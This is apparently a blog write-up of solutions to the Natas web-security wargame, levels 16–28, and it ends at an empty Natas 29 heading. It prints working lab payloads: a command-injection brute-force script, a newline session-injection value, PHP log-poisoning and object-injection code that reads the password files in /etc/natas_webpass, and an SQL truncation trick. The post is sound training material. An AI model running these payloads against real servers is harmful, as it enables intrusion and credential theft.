---
layout: article
key: 202003230
pageview: true
title: Natas Wargames Solutions (16-34)
tags: ctf
excerpt: My followup writeup to challenges that I solved in Natas Wargames
---

## Overview

These set of challenges on the Wargames are focussed on Web Application Security Testing and Scanning. Each machine stores the credentials for the next machine. **All passwords are also stored in /etc/natas_webpass/**. In this article, I cover the solutions from 16-34.

These are followup to the challenges post which I put out earlier for the challenges 1-15.





### Natas 16

This one presents us with the possibility of command injection. But there is a twist - There is a filtering on characters like ';', '|' /[;|&`\'"]/ etc. This removes the possibility of simply appending a command and getting it executed. Remember, our goal here is to read the contents of the file **/etc/natas_webpass/natas17**. 

The first clue is if we search for something like "__^He__". Note that the "^" is not in the list of illegal characters. We get all the words starting from the letters "He" like He , Hebrew etc. 

The question we should be asking is __"What if we could use the contents of the target file to perform the search? "__

Look at the expression

```bash
^$(grep -o ^A /etc/natas_webpass/natas17)
```

What this expression is doing is searching for a prefix "A", i.e checking whether the password is starting with  A, and then using the result of the inner prefix search to feed the outer "^" . If the password does start with an A, it would simply return the letter A (The matched prefix), and if it fails the grep returns null, so the command simply becomes ^null , and we search for ^ which returns all words. However we could simply add a letter , say "I" after the above expression.

```bash
^$(grep -o ^A /etc/natas_webpass/natas17)I
```

What do we get now? If the inner grep fails (the prefix guess is incorrect), the query resolves to **^I** , and if the inner query is successful, the query resolves to **^{matched prefix}I**. If we search for the letter I, the results always begin with the single personal pronoun "I".

So here we start by launching a bruteforce attack on all the characters in keyspace [a-zA-Z0-9] across the length of the password(same length for all levels). We can automate this in python with the powerful **requests** module which supports multiple http authentication types. The script is shown below. 

```python
import requests
from requests.auth import HTTPBasicAuth


#identified sample=^$(grep -o ^Wa natas16)I

user='natas16'
passw='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
#clumsy but manageable
keyspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
leet = ""
for i in range(len(passw)):
    
    #if inner loop's guess is wrong then exploit will return I
    for j in range(len(keyspace)):
        expl ="^$(grep -o ^{} /etc/natas_webpass/natas17)I".format(leet+keyspace[j])
        #print(expl)
        payload= {'needle': expl, 'submit': 'Search'}
        answer=requests.get('http://natas16.natas.labs.overthewire.org/', params=payload,auth=HTTPBasicAuth(user,passw))
        str1 = answer.text
        start = str1.find('<pre>\n')+len('<pre>\n')
        end = str1.find('</pre>')
        str2=[x for x in str1[start:end].split("\n")]
        #print(str2[0])
        if str2[0]!='I':
            leet+=keyspace[j]
            print(leet)
            break
print(leet)

```

Good programming excercise to get command injection.



### Natas 17

To get the credentials of Natas18, we need to launch a blind SQL injection attack as the outputs of the SQL query are being consumed by the web server to prevent diagnosis. To achieve this , a good programming excercise is to write your own tool in python . However, I used SQLMap which performs the blind SQL injection attack and prints the password.



### Natas 18

The idea here is to login as admin, and get the web application to display the password for the next level. However, the admin does not have a brute-forcible password. The point of target here then becomes to guess the PHPSESSID of the admin. In a comment in the source code , it is mentioned that the PHPSESSID has only 640 possible values - which means we should be able to bruteforce it easily.

While you may write a python code, to solve this level, I used BurpSuite's intruder to bruteforce the cookies field. 



### Natas 19

Idea to get the solution here is very similar to the earlier level. Instead of sequential PHPSESSID , it is now a hex encoded value of this {session number}-{username}.  Here, we just bruteforce the session number again, and append it with the targeted username of admin, and then convert it to hex. This can be done by Intruder, and it allows for conversion to hex and adding a suffix to the target payload with ease to the targeted payload.



### Natas 20

To solve this challenge, we must  once again read and analyze the underlying PHP source code. We are logged in as regular user, and we must login as admin.  On reading the source code, we get to know that session is being read from a file. 

To understand better, here is the list of functions in the source code with their functions.Let’s look at each function and see what it does:

- **debug**($msg) Turns on debug if debug is a parameter in the GET request to the page.
- **print_credentials**() will print natas21 username and password if the following conditionals are satisfied: This is what we need to accomplish at the end of our excercise.
  - $_SESSION is true if there is an existing session. The array $_SESSION is not empty.
  - array_key_exists(“admin”, $_SESSION) is true if “admin” key is set in $_SESSION.
  - $_SESSION[“admin”] == 1 is true if the value associated with the key “admin” in $_SESSION is set to 1
- **myopen($path, $name)** always return true provided the path of the file exists.
- **myclose()** always returns true.
- **myread($sid)** has several parts
  - The first if(strspn….) statement check if the $sid contains characters that is within the long string of characters. If it is not, return “Invalid SID”. Otherwise, continue.
  - Then, it check to see if the path exist for the file call /mysess_$sid. For example, if $sid is abcdefg, it is checking for the file mysess_abcdefg. If the file exist, continue.
  - Here, we see that the content of the file is save in $data and the foreach loop take each new line of $data and put it in $line. Then, it takes each space separated word in each $line and put them in an array call $parts. If the first part ($parts[0]) is not an empty string, then it will use the first part as the session key and the second part ($parts[1]) as the value corresponding to that key.
- mywrite($sid, $data) also has several parts
  - The first if(strspn …) does the same check for valid $sid in myread()
  - The same $filename is created using the $sid.
  - The key is sorted in $_SESSION and the foreach loop take the pair of $key and corresponding $value and add it as a new line in $data. The $data is then write to the $filename. Note that new line is used to explode the key value pair and then written to the file. This is the entry point for our approach, **response splitting** attack. The 
- mydestroy($sid) always return true.
- mygarbage($t) always return true.
- main interface does the following:
  - session_start().
  - check name is in the $_REQUEST, if so, set the $_SESSION[“name”] to $_REQUEST[“name”]. If we input “test” as a name, it will correspond “test” as the
  - print_credentials()
  - set $name to empty string and check if “name” is in the $_SESSION, if so, set the variable $name to $_SESSION[“name”]

The key value pair is being read from the file in the $filename. The key vakye oair is being read, and the value of the "admin" must be 1. 
The question is "**Can we insert the line admin=1 by the inputs given to us?**" The trick here is to insert an extra line, and we can do so by splitting up our response. The input would be

```bash
user1%0Aadmin 1
```

This input would be split into 2 usernames when processed by the mywrite function and write the new line "admin 1" after user1. %0a injected here is the newline character. This injection can be done in the url itself. Once the injection is done, we can change the username to admin with ease and get the credentials.





### Natas 21

This challenge is also based on session hijacking. This can be done by tampering the cookie value in the related website. However this is much easier than the previous challenge, we need only inject an extra parameter in the post request of the form to change the color. This parameter is well **admin=1**, which can be deduced by reading the website of the sister site for this challenge. Once this is done, just relaod the web page with the set cookie, and the credentials are revealed. 



### Natas 22

This one is a pretty simple challenge to crack. The main page keeps redirecting you away from it, but when one is using a proxy like Burp, all the redirections and the web page visited are stored in the HTTP history. The webpage we are redirected away from stores the credentials till the redirection limit is reached. The redirect only happens when the query parameter is present in the URL which is also needed to see the credentials.


![picnatas22]({{site.url}}/public/picnatas22.PNG)



### Natas 23

This one is too easy. The acceptability of the input to reveal the password is specified in the code.he first few digits must be number and greater than 10.
The string must also contain iloveyou. The input **233iloveyou** works and reveals the credentials for the next level.



### Natas 24

This challenge pestered me for quite a while. For one thing, the source code does not reveal anything unusual- I thought maybe this challenge requires me to bruteforce the password. The bruteforce approach did not work however. Then I looked at the source code one more time. On looking closely, the source code revealed that the **passwd** variable was not being type checked. Anything we pass will be treated as string, so we cannot break by inserting any sort of special characters- But what if we treated the passwd as an array?

This caused an exception, and this is what was required to get to the next level. The URL of injection then becomes the following

```http
http://natas24.natas.labs.overthewire.org/?passwd[]=a
```





### Natas 25

This challenge's source code inspection reveals a lot of checks being implemented for preventing different attacks. It also reveals that the requests are getting logged by the web server.

This challenge requires a 2-step attack. The logs can be injected here with php code.  The culprit here is the user-agent which is being logged. Again coming back to the security notion that __All user input is untrusted__. We inject the user-agent with the following php code using our old friend Burp Suite to modify the payload before forwarding it.

```php
<?php $x=file_get_contents('/etc/natas_webpass/natas26'); echo $x; ?>
```



Then what? How do we get the code in the log files to be executed?

We clearly need to perform a local file inclusion attack here , after initial inspection of inputs and context. But, the "../" is being recursively deleted - So could we use this to our advantage?

Note that the log file it is written to has the name natas24_{PHPSESSID}.log. Hence we have to include this file. The lang parameter is used for the local file inclusion attack. Note that we could not have included the natas26_webpass file directly as the source code explicitly checks for that. We are also making the assumption here that log files will be executed as PHP code by the server.





### Natas 26

We are given a function to add drawings to the web application page. It can be noted that the drawings are being stored as each request adds incremental drawings to the web page. We have to again, tamper with the cookies to solve this challenge. This challenge is similar to level 11 where we needed to reverse the cookie to alter its contents. 

Here we need to carry out a PHAR exploit or inject a serialized variable to our advantage. Serialization is the process of storing an object’s properties in a binary format, which allows it to be passed around or stored on a disk, so it can be unserialized and used at a later time.

`drawFromUserdata()` which does a couple things. One, if you sent along coordinates it draws corresponding lines. Second, if you sent along the ‘drawing’ cookie, it deserializes the contents of the cookie and draws accordingly.

Seeing the word ‘unserialize’ in a hacking challenge should cause alarm bells to go off in your head. 
Let's look closely at the deserialize function.

```php
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

Phar exploits and serialization bugs have one more important thing to note, the things usually go wrong is when the destructor is called. The attacks could be anywhere from file inclusion to arbitary code execution. There is a nice blog detailing this attack type - https://blog.ripstech.com/2018/php-object-injection/ .

What we’re after is the natas27 password file. There are read as well as write privileges to the `img` folder because that’s where web application stores images. 

With all that being said, let us prepare our payload. Check out the Logger class. Both the constructor and destructor write to a file. What file? Whatever is stored in the `$logFile` member variable. What does it write? What ever is stored in the `$initMsg` and `$exitMsg` member variables. 

Recall that the definition of the class does not go along for the ride when an object is serialized. We only need to make a class named Logger, load up the member variables we want, and send it along. The php program to accomplish or goals has been written below.

```php
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="Initializing object\n";
        #This is the payload
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";   
        #This is to retrive the file using file inclusion, we know the img directory has read privileges.
        #The php extension is important 
        $this->logFile = "/var/www/natas/natas26/img/file_1.php";
    }
}

$logObject = new Logger();
#This is what the value will be set to the drawingObject
print base64_encode(serialize($logObject))."\n";

?>
```

Then , we just need to fetch the file using the URL.



### Natas 27

*"Whitespaces Matter"*

This another beautiful SQL based challenge. This is the first time , I have encountered this challenge in the domain of SQL. Let's get down to look at the source code. 

SQL scheme:- 

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```



The SQL code is pretty straightforward. It simply sets up a database with varchar(64). 64 is the length of the field value. This important information would come up later. 



Functionally, this application is pretty simple. You enter a username and password and if that combo already exists, it displays them back to you. If the username is correct but the password is wrong, you get an error. And finally, if the username doesn’t exist, the application creates said user with the supplied password. Let us analyse the source code closely.

Looking at the **validateUser** and **checkCredentials** function: 



```php
function checkCredentials($link,$usr,$pass){
 
    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```



These functions are basic with one caveat, note that the checkcredential checks for username by the username  and password, what if there are duplicates? The thing is at first glance , the duplicates are not allowed to be added because of the following code snippet., but if they do all the users and passwords (theoretically) would be displayed. 

So, could we add an extra user **natas28** somehow and get the password for both the real **natas28** and our duplicate natas28? Note that the entire array is displayed as the result.

```php
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);
   

    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }        
    } 
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }
```

Here comes into play the behavior of SQL truncation. Remember the limit of 64 on the input fields of password and username? Well , what happens when you try to supply a larger input? Naturally, SQL truncates the extra characters. Eg:: What if the username was 65 A's? The 65th A gets truncated obviously and the username being added to the database has 64 A's.

What if the username has trailing spaces ?  The thing about SQL is these are removed, but after removing the extra 64 spaces if there are spaces they are not removed.
However, here is the interesting part, the space is not used during comparison.
Basically, "user     " and user "user" are returned when using  the following select statement.

```sql
 select * from users where username='user';
```



It is interesting to note that validate user does not truncate the string before comparing. So, this brings us to the strategy.

- We want a second natas28
- We want to insert a duplicate, with trailing spaces . We must use spaces equal to 64-7(len(natas28))=57, so that the select statement for comparison treats them as equal
- However, validate user does not truncate, hence we must ensure we add a character after trailing spaces so that we can cause validateUser to fail and allow the insertion of the duplicate. So we add a trailing character like x to fail this function.



This brings us to our payload for insertion. We can leave the password blank or put a random char, it does not matter.

Username:'natas28<57spaces>x' (65char long string)
password: x

Next we login as natas28, and password is x. This displays the credentials for the next challenge.                  









### Natas 28

__"Even AES is insecure in ECB mode"__

Here, we see we can query using an input, but there is no option to view the source code. When we query something , the query is displayed in the URL header. Let us dive further into that. If some of you have worked on cryptopal challenges before, this is familiar territory. 

See the query from URL header (after URL decode): (I supplied 'a')

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
```

 The terminating "=" sign, led me to guess it was base64 encoded. After decoding , I was looking at the raw encrypted bytes.

```
%[WFm܄ru\
og$uThQ\o*UDYGOK*,-vr1Qp
```

The above might be displayed differently, but it is garbage to the untrained eye. 

So, what is our target here. SQL injection. But, we cannot inject from the input field- All characters are being escaped there. So we have to inject the query parameter in the URL header, to do that we need to encrypt our payload in the right way, so it decrypts to our payload. This challenge would require us to understand and break the encryption scheme, and figure out the credentials for the next level.

**Step 1** : What is our target? To get the credentials for natas29 by querying the database. SQL injection, so noting down the SQL query which we would need to encrypt.











### Natas 29